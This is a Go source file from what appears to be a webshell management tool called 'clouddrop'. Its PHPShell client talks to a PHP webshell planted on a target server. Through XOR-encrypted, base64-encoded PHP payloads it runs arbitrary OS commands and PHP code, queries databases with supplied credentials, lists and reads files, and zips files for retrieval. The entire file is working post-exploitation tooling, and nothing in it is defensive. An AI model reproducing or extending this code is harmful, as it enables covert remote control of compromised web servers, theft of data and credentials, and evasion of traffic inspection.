package service

import (
	"clouddrop/pkg/util"
	"fmt"
	"log"
	"strings"
)

var PhpSessions map[int]string

func (s *PHPShell) GetShellType() string {
	return "php"
}

func (s *PHPShell) FreshSession(id int, shellURL string, password string) (string, error) {
	if PhpSessions == nil {
		PhpSessions = make(map[int]string)
	}

	dynamicPassword := util.GeneratePasswordSeed()
	code, err := readPayload("php", "Check.php")
	if err != nil {
		return "", err
	}
	code = payloadWithSuffix(code, "\nmain();")
	enCode := util.EncryptWithOffset(code, dynamicPassword, util.RequestOffsetForShell(s.GetShellType()))

	PhpSessions[id], err = util.PostRequestWithoutSession(shellURL, dynamicPassword, enCode)
	if err != nil {
		return "", err
	}
	log.Println("当前PHP会话 " + PhpSessions[id])

	enResult, err := util.PostRequest(shellURL, dynamicPassword, enCode, PhpSessions[id], s.GetShellType())
	if err != nil {
		return "", err
	}
	res, err := util.DecryptWithOffset(strings.TrimSpace(enResult), dynamicPassword, 5)
	if err != nil {
		return "", err
	}
	return strings.TrimSpace(res), nil
}

func (s *PHPShell) BaseInfo(id int, shellURL string, password string) (string, error) {
	code, err := readPayload("php", "BaseInfo.php")
	if err != nil {
		return "", err
	}
	code = payloadWithSuffix(code, "\nmain();")
	return util.HookPostWithOptions(shellURL, password, code, PhpSessions[id], s.GetShellType(), nil)
}

func (s *PHPShell) ExecCommand(id int, command string, shellURL string, password string) (string, error) {
	osCode, err := readPayload("php", "OS.php")
	if err != nil {
		return "", err
	}
	osCode = payloadWithSuffix(osCode, "\nmain();")
	osType, err := util.HookPostWithOptions(shellURL, password, osCode, PhpSessions[id], s.GetShellType(), nil)
	if err != nil {
		return "", err
	}

	code, err := readPayload("php", "CMD.php")
	if err != nil {
		return "", err
	}
	cmdPath := chooseWindowsCmd(osType)
	code = payloadWithSuffix(code, fmt.Sprintf("\nmain(%s, \"true\", %s);", phpQuote(cmdPath), phpQuote(command)))
	return util.HookPostWithOptions(shellURL, password, code, PhpSessions[id], s.GetShellType(), nil)
}

func (s *PHPShell) ExecCode(id int, code string, shellURL string, password string) (string, error) {
	shellcode := fmt.Sprintf(`
error_reporting(0);
session_start();
$res = main();
echo encrypt($res, $_SESSION['k']);
function main() {
	ob_start();
	%s
	return ob_get_clean();
}
function encrypt($data, $key) {
	for($i=0; $i<strlen($data); $i++) {
		$data[$i] = $data[$i] ^ $key[($i+5)&15];
	}
	return base64_encode($data);
}`, code)
	return util.HookPost(shellURL, password, shellcode, PhpSessions[id], s.GetShellType())
}

func (s *PHPShell) ExecSql(id int, driver, host, port, user, pass, database, sql, option, encoding, shellURL, password string) (string, error) {
	code, err := readPayload("php", "Database.php")
	if err != nil {
		return "", err
	}
	if database == "" {
		code = payloadWithSuffix(code, fmt.Sprintf("\nlistDatabases(%s, %s, %s, %s, %s, %s);",
			phpQuote(driver), phpQuote(host), phpQuote(port), phpQuote(user), phpQuote(pass), phpQuote(encoding)))
	} else {
		code = payloadWithSuffix(code, fmt.Sprintf("\nmain(%s, %s, %s, %s, %s, %s, %s, %s, %s);",
			phpQuote(driver), phpQuote(host), phpQuote(port), phpQuote(user), phpQuote(pass), phpQuote(database), phpQuote(sql), option, phpQuote(encoding)))
	}
	return util.HookPostWithOptions(shellURL, password, code, PhpSessions[id], s.GetShellType(), nil)
}

func (s *PHPShell) FileZip(id int, srcPath string, toPath string, shellURL string, password string) (string, error) {
	code, err := readPayload("php", "FileZip.php")
	if err != nil {
		return "", err
	}
	code = payloadWithSuffix(code, fmt.Sprintf("\nmain(%s, %s);", phpQuote(srcPath), phpQuote(toPath)))
	return util.HookPostWithOptions(shellURL, password, code, PhpSessions[id], s.GetShellType(), nil)
}

func (s *PHPShell) FileUnZip(id int, srcPath string, toPath string, shellURL string, password string) (string, error) {
	code, err := readPayload("php", "FileUnZip.php")
	if err != nil {
		return "", err
	}
	code = payloadWithSuffix(code, fmt.Sprintf("\nmain(%s, %s);", phpQuote(srcPath), phpQuote(toPath)))
	return util.HookPostWithOptions(shellURL, password, code, PhpSessions[id], s.GetShellType(), nil)
}

func (s *PHPShell) FileList(id int, path string, shellURL string, password string) (string, error) {
	code, err := readPayload("php", "FileList.php")
	if err != nil {
		return "", err
	}
	code = payloadWithSuffix(code, fmt.Sprintf("\nmain(%s);", phpQuote(path)))
	return util.HookPostWithOptions(shellURL, password, code, PhpSessions[id], s.GetShellType(), nil)
}

func (s *PHPShell) FileShow(id int, path string, shellURL string, password string) (string, error) {
	code, err := readPayload("php", "FileShow.php")
	if err != nil {
		return "", err
	}
	code = payloadWithSuffix(code, fmt.Sprintf("\nmain(%s);", phpQuote(path)))
	return util.HookPostWithOptions(shellURL, password, code, PhpSessions[id], s.GetShellType(), nil)
}
